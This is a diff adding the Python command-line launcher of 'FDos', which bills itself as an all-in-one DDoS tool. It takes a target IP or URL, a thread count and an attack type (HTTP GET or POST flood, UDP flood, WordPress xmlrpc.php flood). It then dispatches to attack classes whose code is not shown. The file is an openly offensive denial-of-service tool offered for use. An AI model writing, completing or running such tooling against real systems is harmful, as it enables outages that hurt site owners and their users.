@@ -1,0 +1,85 @@
+#############################################################
+# FDos - All Ddos in one tools!.
+# Credit : https://github.com/fooster1337
+# If free, just use it okey?
+#############################################################
+import argparse
+from ddos.httpsgp import Http
+from ddos.udp import Udp
+from ddos.xmlrpc import Xmlrpc
+import sys
+import ipaddress
+from urllib.parse import urlparse
+
+version = 1.0
+
+def error_msg(msg):
+    print(f"[ERROR] {msg}")
+
+
+def uparse(url):
+    return urlparse(url).netloc
+
+def main():
+    parser = argparse.ArgumentParser(description="FDos - All Ddos in one tools.")
+    parser.add_argument('-t', '--target', help='Set target (IP/Domain)', metavar='target')
+    parser.add_argument('-d', '--ddos', help='DDOS Type (use -ld/--list_ddos)', metavar='ddos_type')
+    parser.add_argument('-s', '--sleep', help='Delay when down/something error.', type=int, default=0.1, metavar='time')
+    parser.add_argument('-th', '--thread', help='Thread for attack. Default = 10', type=int, default=10, metavar='number_thread')
+    parser.add_argument('-v', '--version', help='Show Version Tools', required=False, action='store_true')
+    parser.add_argument('-ld', '--list_ddos', help='Show DDOS Type', action='store_true')
+    
+    #print(args)
+    if len(sys.argv) <= 1:
+        parser.parse_args(['-h'])
+        sys.exit(0)
+    else:
+        args = parser.parse_args()
+        if args.version:
+            print(version)
+        if args.target:
+            try:
+                if args.target.startswith((('http://', 'https://', 'www.'))):
+                    tipe = "website"
+                else:
+                    ipaddress.ip_address(args.target)
+                    tipe = "ip"
+            except:
+                error_msg("Target not valid. please use ip address or if you target is website use http/https")
+                sys.exit(0)
+
+        if args.list_ddos:
+            list_ddos = """DDoS Attack Available : \nHTTP/SG (HTTP/S GET METHOD)
+HTTP/SP (HTTP/S POST METHOD)
+UDP (UDP FLOOD)
+XMLRPC (XMLRPC.PHP DDOS ON WORDPRESS SITE)
+For using : -d (ddos_type) example : -d HTTP/SG or -d XMLRPC"""
+            print(list_ddos)
+            sys.exit(0)
+        if args.ddos:
+            ddos_type = ['HTTP/SG', 'HTTP/SP', 'UDP', 'XMLRPC']
+            if args.ddos.upper() not in ddos_type:
+                error_msg("DDOS Type not found. Please check -ld/--list_ddos")
+
+        if args.target is None:
+            error_msg('Target cannot be empty. use -t/--target you_target'); sys.exit(0)
+        if args.ddos is None:
+            error_msg('DDoS type cannot be empty. use -d/--ddos ddos_type\nFor list type ddos use -ld/--list_ddos'); sys.exit(0)
+        
+        # execute
+        if args.ddos.upper() == "HTTP/SP" or args.ddos.upper() == "HTTP/SG":
+            send = Http(args.ddos, args.target, args.sleep, args.thread, tipe)
+            send.attack()
+
+        if args.ddos.upper() == "UDP":
+            send = Udp(args.target, args.thread, args.sleep)
+            send.attack()
+
+        if args.ddos.upper() == "XMLRPC":
+            if '/xmlrpc.php' not in args.target:
+                error_msg("Please include path xmlrpc.php"); sys.exit(0)
+            send = Xmlrpc(args.target, args.thread, args.sleep)
+            send.attack()
+        
+if __name__ == '__main__':
+    main()
